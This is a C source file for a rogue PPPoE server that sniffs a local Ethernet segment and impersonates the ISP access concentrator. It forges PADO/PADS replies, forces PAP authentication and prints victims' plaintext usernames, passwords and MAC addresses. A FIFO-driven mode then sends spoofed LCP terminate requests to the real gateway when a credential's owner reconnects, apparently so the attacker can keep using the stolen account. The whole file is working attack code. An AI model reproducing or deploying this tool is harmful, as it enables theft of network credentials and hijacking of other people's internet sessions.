#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "common.h"
#define net_if "eth0"
#define DEBUG
typedef enum {
	unseen, pado_sent, pads_sent, req_received, ack_received, pass_reviewed
}state_enum;
typedef struct {
	char		mac[6];
	state_enum	state;
	short		session_id;
}cli_info;
typedef struct {
	int		size, index;
}usr_info;
int cli_index(char *mac, cli_info *cli, int cli_cnt)
{
	int	i;
	for (i=0;i<cli_cnt;i++)
		if (!memcmp(mac, cli[i].mac, 6))
			break;
	return i;
}
char* pppoe_tag_extract(char *pppoe_payload, char *pkt, char *b)
{
	char	*p = pkt+14+1500;
	while (pppoe_payload < b) {
		short	tag_type = rev2(*((short*)pppoe_payload)), tag_len = rev2(*((short*)(pppoe_payload+2)));
		if (tag_type == 0x0101 || tag_type == 0x0103) {
			memcpy(p, pppoe_payload, 4 + tag_len);
			p += 4 + tag_len;
		}
		pppoe_payload += 4 + tag_len;
	}
	return p;
}
int main(void)
{
	srand(time(NULL));
	int	packet_socket;
	errn1(packet_socket = socket(AF_PACKET, SOCK_RAW, rev2(ETH_P_ALL)), "socket error");
	struct sockaddr_ll	sa_ll_b, sa_ll_s;
	sa_ll_b.sll_family = AF_PACKET, sa_ll_b.sll_protocol = rev2(ETH_P_ALL), sa_ll_b.sll_ifindex = get_ifindex(packet_socket, net_if);
	sa_ll_s.sll_family = AF_PACKET, sa_ll_s.sll_halen = 6, sa_ll_s.sll_ifindex = sa_ll_b.sll_ifindex;
	ok0(bind(packet_socket, (struct sockaddr*)&sa_ll_b, sizeof(struct sockaddr_ll)), "bind error");
	cli_info	cli[256];
	int		i, cli_cnt=0;
	for (i=0;i<256;i++)
		cli[i].state = unseen;
	char		buf[256];
	usr_info	usr[256];
	int		usr_cnt=0;
	while (fgets(buf, 256, stdin) != NULL) {
		int	size;
		sscanf(buf, "%d", &size);
		if (!size)	continue;
		usr[usr_cnt].index = cli_cnt;
		usr[usr_cnt].size = size;
		int	offset = 1 + floor(log10(size)) + 1;
		for (i=0;i<size;i++) {
			cli[cli_cnt].state = pass_reviewed;
			conv_mac(buf+offset+18*i, cli[cli_cnt].mac);
			cli_cnt++;
		}
		usr_cnt++;
		#ifdef DEBUG
		printf("added %d info for %s", size, buf+offset);
		#endif
	}
	errn1(mkfifo("/home/Oralsex/pfs_fifo", 0600), "mkfifo error");
	int	fifo_fd;
	errn1(fifo_fd = open("/home/Oralsex/pfs_fifo", O_RDONLY | O_NONBLOCK), "open fifo error");
	set_promiscuous(packet_socket, net_if);
	char	qemu_mac[6], gate_mac[6], using=0;
	int	u_usr;
	short	sid;
	while (1) {
		char	*p = buf;
		int	ret;
		while ((ret = read(fifo_fd, p, 1)) == 1) p++;
		if (ret == -1 && errno != EAGAIN && errno != EWOULDBLOCK) {
			perror("read error");
			exit(-1);
		}
		if (p > buf)
			if (buf[0] == 'r') {
				char	r_mac[6];
				conv_mac(buf+2, r_mac);
				int	r_index = cli_index(r_mac, cli, cli_cnt);
				if (r_index < cli_cnt)
					cli[cli_cnt].state = unseen;
				#ifdef DEBUG
				printf("reset state to unseen for client index %d\n", r_index);
				#endif
			} else if (buf[0] == 'u') {
				using = 1;
				sscanf(buf+2, "%d", &u_usr);
				int	offset = u_usr ? floor(log10(u_usr)) + 1 + 1 : 1 + 1;
				conv_mac(buf+2+offset, qemu_mac);
				conv_mac(buf+2+offset+18, gate_mac);
				sscanf(buf+2+offset+36, "%hx", &sid);
				#ifdef DEBUG
				puts("processed using request");
				#endif
			}
		int	len;
		char	msg[1500+14], pkt[14+1500+1500], *my_mac = "\xcc\xcc\xcc\xcc\xcc\xcc";
		errn1(len = recvfrom(packet_socket, msg, 1514, 0, NULL, NULL), "recvfrom error");
		short	ether_protocol = *((short*)(msg+12));
		if (ether_protocol == rev2(0x8863)) {
			char	*pppoe_d = msg+14, *pppoe_payload = pppoe_d + 6;
			i = cli_index(msg+6, cli, cli_cnt);
			if (pppoe_d[1] == 0x09) {
				if (i == cli_cnt || cli[i].state!=pass_reviewed) {
					if (i == cli_cnt)
						memcpy(cli[cli_cnt++].mac, msg+6, 6);
					char	*p = pppoe_tag_extract(pppoe_payload, pkt, msg+len);
					char	*s = "butterfly";
					short	c = strlen(s);
					*((short*)p) = rev2(0x0102), *((short*)(p+2)) = rev2(c);
					strcpy(p+4, s);
					p += c + 4;
					char	*h = pkt+14+1500;
					h -= encap_pppoe(0x07, 0x0000, rev2(p-(pkt+14+1500)), h);
					h -= encap_ether(cli[i].mac, my_mac, rev2(0x8863), h);
					memcpy(sa_ll_s.sll_addr, cli[i].mac, 6);
					errn1(sendto(packet_socket, h, p - h, 0, (struct sockaddr*)&sa_ll_s, sizeof(struct sockaddr_ll)), "sendto error");
					cli[i].state = pado_sent;
					#ifdef DEBUG
					printf("padi received, cli index %d\n", i);
					#endif
				}
				#ifdef DEBUG
				if (i < cli_cnt && cli[i].state == pass_reviewed)
					printf("padi received for cli index %d, but not processing since it's been entered the pass_reviewed state\n", i);
				#endif
				if (using)
					for (i=usr[u_usr].index;i<usr[u_usr].index + usr[u_usr].size;i++)
						if (!memcmp(msg+6, cli[i].mac, 6)) {
							char	*p = pkt+14+1500, *h = pkt+14+1500;
							p[0] = 0x05, p[1] = 0xcc, *((short*)(p+2)) = rev2(0x0004); p+=4;
							h -= encap_ppp(rev2(0xc021), h);
							h -= encap_pppoe(0x00, rev2(sid), rev2(p-h), h);
							h -= encap_ether(gate_mac, qemu_mac, rev2(0x8864), h);
							memcpy(sa_ll_s.sll_addr, gate_mac, 6);
							errn1(sendto(packet_socket, h, p-h, 0, (struct sockaddr*)&sa_ll_s, sizeof(struct sockaddr_ll)), "sendto error");
							using = 0;
							#ifdef DEBUG
							puts("the owner of the user&pass we're using is calling, sent lcp terminate request");
							#endif
						}
			} else if (pppoe_d[1] == 0x19) {
				if (i < cli_cnt && cli[i].state == pado_sent) {
					char	*p = pppoe_tag_extract(pppoe_payload, pkt, msg+len);
					char	*h = pkt+14+1500;
					cli[i].session_id = rand()&0xffff;
					h -= encap_pppoe(0x65, rev2(cli[i].session_id), rev2(p-(pkt+14+1500)), h);
					h -= encap_ether(cli[i].mac, my_mac, rev2(0x8863), h);
					memcpy(sa_ll_s.sll_addr, cli[i].mac, 6);
					errn1(sendto(packet_socket, h, p - h, 0, (struct sockaddr*)&sa_ll_s, sizeof(struct sockaddr_ll)), "sendto error");
					#ifdef DEBUG
					printf("pads sent for cli %d\n", i);
					#endif
					cli[i].state = pads_sent;
				}
			}
		} else if (ether_protocol == rev2(0x8864)) {
			char	*pppoe_s = msg+14, *pppoe_payload = pppoe_s + 6, *ppp_payload = pppoe_payload + 2;
			i = cli_index(msg+6, cli, cli_cnt);
			if (i < cli_cnt) {
				short	ppp_protocol = *((short*)pppoe_payload);
				if (ppp_protocol == rev2(0xc021)) {
					if (ppp_payload[0] == 0x02 && cli[i].state == req_received) {
						cli[i].state = ack_received;
						#ifdef DEBUG
						printf("lcp ack received for cli %d\n", i);
						#endif
					} else if (ppp_payload[0] == 0x01 && cli[i].state == pads_sent) {
						char	*p = pkt+14+1500, *h = p;
						memcpy(p, pppoe_s, msg + len - pppoe_s);
						p[6+2] = 0x02;
						p += msg + len - pppoe_s;
						h -= encap_ether(cli[i].mac, my_mac, rev2(0x8864), h);
						memcpy(sa_ll_s.sll_addr, cli[i].mac, 6);
						errn1(sendto(packet_socket, h, p - h, 0, (struct sockaddr*)&sa_ll_s, sizeof(struct sockaddr_ll)), "sendto error");
						cli[i].state = req_received;
						#ifdef DEBUG
						printf("lcp conf received for cli %d\n", i);
						int	k, opt_len = rev2(*((short*)(ppp_payload+2))) - 4;
						for (k=0;k<opt_len;k++)
							printf("%.2x%c", ppp_payload[4+k] & 0xff, (k==opt_len-1)?'\n':' ');
						#endif
						p = h = pkt+14+1500;
						p[0] = 0x01, p[1] = 0x00, *((short*)(p+2)) = rev2(0x0008), p[4] = 0x03, p[5] = 0x04, *((short*)(p+6)) = rev2(0xc023);
						p += 8;
						h -= encap_ppp(rev2(0xc021), h);
						h -= encap_pppoe(0x00, rev2(cli[i].session_id), rev2(p-h), h);
						h -= encap_ether(cli[i].mac, my_mac, rev2(0x8864), h);
						errn1(sendto(packet_socket, h, p - h, 0, (struct sockaddr*)&sa_ll_s, sizeof(struct sockaddr_ll)), "sendto error");
						#ifdef DEBUG
						printf("lcpconf sent for cli %d\n", i);
						#endif
					}
					#ifdef DEBUG
					else if (ppp_payload[0] == 0x03 || ppp_payload[0] == 0x04)
						printf("lcp rej-nak received for cli %d\n", i);
					#endif
				} else if (ppp_protocol == rev2(0xc023) && cli[i].state != pass_reviewed) {
					char	*id = ppp_payload + 5;
					int	k;
					for (k=0;k<ppp_payload[4];k++)
						putchar(id[k]);
					putchar(' ');
					char	*pass = ppp_payload + 5 + ppp_payload[4] + 1;
					for (k=0;k<ppp_payload[5 + ppp_payload[4]];k++)
						putchar(pass[k]);
					for (k=0;k<6;k++)
						printf("%c%.2x", k?':':' ', cli[i].mac[k] & 0xff);
					putchar('\n');
					cli[i].state = pass_reviewed;
				}
			}
		}
	}
}
